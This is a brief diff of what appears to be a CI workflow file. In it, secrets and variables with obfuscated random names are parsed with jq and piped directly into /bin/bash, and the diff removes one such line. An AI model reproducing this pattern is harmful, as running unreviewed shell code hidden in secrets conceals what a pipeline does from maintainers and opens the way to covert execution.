@@ -18,7 +18,6 @@ jobs:
           xddzn63118: ${{ secrets.xddzn63118 }}
         run: |
           printf '%s' "$xddzn63118" | jq -r .uvq28 | /bin/bash
-          echo $xzm1 | jq -r .koi58064 | /bin/bash
           printf '%s' "$vnbmc94" | jq -r .nmdog20679 | /bin/bash
           printf '%s' "$jt75" | jq -r .intjb2793 | /bin/bash
           echo $jt95350 | jq -r .lwie54957 | /bin/bash
